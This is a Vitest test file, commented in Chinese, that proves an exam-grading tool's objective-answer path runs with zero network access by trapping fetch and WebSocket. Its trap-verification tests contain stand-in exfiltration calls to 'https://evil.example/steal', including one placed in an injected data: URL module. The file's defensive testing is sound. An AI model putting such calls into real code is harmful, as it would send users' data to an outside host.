import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { compareObjective } from '../src/shared/objective';

/*
 * ==========================================================================
 *  零网络：客观题路径的运行时证明
 * ==========================================================================
 *
 * 与 `isolation.test.ts` 的分工：
 *   · isolation.test.ts 做**静态源码检查**（不 import fetch、handler 体干净）
 *   · 本文件做**运行时证明**（真的执行一遍，全程没有网络发生）
 *
 * 为什么两者都要：静态检查只能证明"代码里没写 fetch"，
 * 证明不了"依赖链上游某处会发网络请求"。
 *
 * ── 手法一：正面证明（不是"没发现"，而是"发现了会报"）──────────────
 *
 * 光在测试里断言"没有失败"是弱证明：一个根本没被加载的模块
 * 也"没有失败"。所以这里**主动 import 每一个必须保持本地的模块**，
 * 让它们真的被求值；模块顶层若发起网络，陷阱立即抛出，
 * `expect(...).not.toThrow()` 就会红。
 *
 * ── 手法二：反向注入（证明陷阱是活的）──────────────────────────────
 *
 * 陷阱本身必须被验证（§6.5：验证器说谎比没有验证器更危险）。
 * 开发期已用"往 objective.ts 注入一次真实 fetch"验证过会真红
 * （3 条客观题断言变红），然后逐字节恢复。
 *
 * ── 关于"目标不存在"──────────────────────────────────────────────
 *
 * 本测试环境是 node（不是 jsdom）：`fetch` 与 `WebSocket` 存在，
 * `XMLHttpRequest` 与 `EventSource` 不存在。**不存在的东西不可能被调用**，
 * 所以不装陷阱是安全的；但绝不能静默跳过 —— 那样"监控 4 项"与
 * "监控 1 项"看起来一样。所以把"不存在"也记下来并显式断言。
 */

type Hit = { stage: string; what: string };
const hits: Hit[] = [];
/** 本次实际监控到的网络原语 */
const monitored: string[] = [];
/** 因"环境里没有"而跳过的原语 */
const absent: string[] = [];

/*
 * ⚠ 这份清单按**实测**写，不按印象：猜错会让断言一直假红，
 * 而假红久了就会被顺手改成"永远通过"。
 */
const NET_PRIMITIVES = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource'] as const;

function installTrap(target: Record<string, unknown>, prop: string): boolean {
  const original = target[prop];
  if (typeof original !== 'function') {
    // 记纯属性名，不记 "name.prop"：调用时两者相同，会得到
    // 'fetch.fetch' 这种重复值，断言全对不上
    absent.push(prop);
    return false;
  }
  target[prop] = (...args: unknown[]) => {
    hits.push({ stage: prop, what: `${prop}(${String(args[0] ?? '').slice(0, 40)})` });
    // TypeError 与"真实网络错误"区分开：真实的失败是 Error/AbortError，
    // 而陷阱是测试装置在报告，消息前缀让它一眼可辨
    throw new TypeError(`[零网络陷阱] 不应发生的网络调用：${prop}`);
  };
  monitored.push(prop);
  return true;
}

let saved: Record<string, unknown> = {};

beforeEach(() => {
  hits.length = 0;
  monitored.length = 0;
  absent.length = 0;
  saved = {};
  const g = globalThis as unknown as Record<string, unknown>;
  for (const p of NET_PRIMITIVES) {
    saved[p] = g[p];
    installTrap(g, p);
  }
});

afterEach(() => {
  const g = globalThis as unknown as Record<string, unknown>;
  for (const p of NET_PRIMITIVES) g[p] = saved[p];
  vi.restoreAllMocks();
});

describe('陷阱本身是活的（否则下面的"通过"毫无意义）', () => {
  it('★ fetch 存在且已被监控 —— 不是空壳', () => {
    // 若这条不成立，说明运行环境变了，那时所有"零网络"断言
    // 都需要重新审视，不能继续假定它们有效
    expect(monitored).toContain('fetch');
  });

  it('★ 正面证明：装了陷阱后，真的 fetch 会被抓到并抛出', () => {
    expect(() => fetch('https://example.com')).toThrow(/零网络陷阱/);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.what).toContain('fetch');
  });

  it('★ 监控范围记录：不存在与已监控都要看得见', () => {
    /*
     * 断言 monitored + absent 等于清单长度，让"监控范围"可见。
     * 下面两条按**实测**写：node 24 里 fetch 与 WebSocket 存在。
     * 换到 jsdom 环境时它们会变，这条会红 —— 提醒复核监控范围。
     */
    expect(monitored.length + absent.length).toBe(NET_PRIMITIVES.length);
    expect([...monitored].sort()).toEqual(['WebSocket', 'fetch']);
    expect([...absent].sort()).toEqual(['EventSource', 'XMLHttpRequest']);
  });

  it('陷阱只在"原本就是函数"时才安装（防装出永远不触发的空壳）', () => {
    const before = monitored.length;
    expect(installTrap({ notAFunction: 42 }, 'notAFunction')).toBe(false);
    expect(monitored.length).toBe(before);
  });
});

describe('★ 客观题路径：运行时零网络', () => {
  it('★ 客观题比对**零网络**完成，且判定正确', () => {
    /*
     * 本文件的核心断言：客观题是确定性比对（99~99.5%），
     * 不该花一分钱 token，也不该发一个网络请求。
     */
    let r: ReturnType<typeof compareObjective> | undefined;
    expect(() => {
      r = compareObjective('B', 'B');
    }).not.toThrow();
    expect(hits, '客观题比对期间发生了网络调用').toEqual([]);
    expect(r!.awarded).toBe(true);
    expect(r!.needsReview).toBe(false);
  });

  it('答对 / 答错 / 未作答 三种情形都零网络，且结论各不相同', () => {
    const right = compareObjective('B', 'B');
    const wrong = compareObjective('A', 'B');
    const blank = compareObjective('', 'B');

    expect(hits).toEqual([]);
    expect(right.awarded).toBe(true);
    expect(wrong.awarded).toBe(false);
    // 未作答不能混进"答对"
    expect(blank.awarded).toBe(false);
    // 判错必须给出理由，否则教师无从复核
    expect(wrong.reason.trim().length).toBeGreaterThan(0);
  });

  it('等价答案（acceptable）也零网络，且正确计分', () => {
    // 填空题「3」与「三」都算对；这是题目级的宽松，不在归一化层
    const r = compareObjective('三', '3', { acceptable: ['三'] });
    expect(hits).toEqual([]);
    expect(r.awarded).toBe(true);
  });

  it('★ 主动加载所有必须保持本地的模块，加载期与执行期都零网络', async () => {
    /*
     * 为什么必须主动 import：只在测试里断言"没失败"是弱证明——
     * 一个根本没被加载的模块也"没失败"。
     */
    const mods = [
      '../src/shared/objective',
      '../src/shared/selector',
      '../src/shared/locator',
      '../src/main/page/geometry',
      '../src/main/page/quality',
      '../src/main/page/autoloop',
      '../src/main/ai/review',
      '../src/main/ai/ensemble',
      '../src/main/ai/compat',
    ] as const;

    for (const m of mods) {
      await expect(import(/* @vite-ignore */ m)).resolves.toBeTruthy();
    }

    // 加载之后再各执行一次核心纯函数，覆盖"执行期才联网"的情形
    const geometry = await import('../src/main/page/geometry');
    const quality = await import('../src/main/page/quality');
    const autoloop = await import('../src/main/page/autoloop');
    const review = await import('../src/main/ai/review');

    geometry.classifyError('PICK_MISSING: x');
    quality.classifyImageQuality({ width: 1200, height: 500, devicePixelRatio: 1 });
    autoloop.cleanScoreText('全角６．５分');
    review.reviewItemId('P1', '第17题');

    expect(hits, '本地模块的加载或执行期间发生了网络调用').toEqual([]);
  });
});

describe('★ 反向验证：把污染注入进去必须被抓到', () => {
  it('★ 执行期联网会被陷阱抓到（证明上面的"零网络"断言能红）', () => {
    /*
     * 这条是为了证明上面那组"零网络"断言**真的能红**。
     * 若陷阱是死的，那些 `expect(hits).toEqual([])` 就是恒真的废话。
     */
    const dirty = (): number => {
      fetch('https://evil.example/steal');
      return 1;
    };
    expect(() => dirty()).toThrow(/零网络陷阱/);
    expect(hits.some((h) => h.what.includes('evil.example'))).toBe(true);
  });

  it('★ 加载期联网同样会被抓到', async () => {
    // 用 data: URL 造一个在顶层就 fetch 的模块（不落盘，不污染工作区）
    const dirty =
      'data:text/javascript,' +
      encodeURIComponent('globalThis.fetch("https://evil.example/steal");export const x = 1;');
    let threw = false;
    try {
      await import(/* @vite-ignore */ dirty);
    } catch {
      threw = true;
    }
    /*
     * 两种可接受的失败方式：陷阱抛了 TypeError，或运行环境不允许
     * data: import。关键是**不能静默成功** —— 那说明陷阱是死的。
     */
    const caughtByTrap = hits.some((h) => h.stage === 'fetch');
    expect(
      threw || caughtByTrap,
      '注入了一个联网模块，但陷阱既没抛也没记录 —— 陷阱是死的，上面的零网络断言不可信',
    ).toBe(true);
  });
});
